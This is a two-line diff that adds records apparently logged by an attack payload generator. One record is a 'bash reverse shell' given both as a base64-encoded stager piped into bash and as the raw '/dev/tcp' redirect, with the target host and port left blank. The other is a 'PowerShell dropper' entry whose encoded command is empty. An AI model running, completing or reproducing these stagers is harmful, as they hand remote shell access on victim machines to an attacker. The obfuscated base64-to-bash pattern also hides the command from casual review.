@@ -1,0 +1,2 @@
+{'type': 'bash reverse shell', 'stager': 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8vIDA+JjE= | base64 -d | bash', 'raw': 'bash -i >& /dev/tcp// 0>&1', 'timestamp': '2025-07-09T21:35:50.048007'}
+{'type': 'PowerShell dropper', 'payload': 'powershell -EncodedCommand ', 'original': '', 'timestamp': '2025-07-09T21:35:50.049815'}
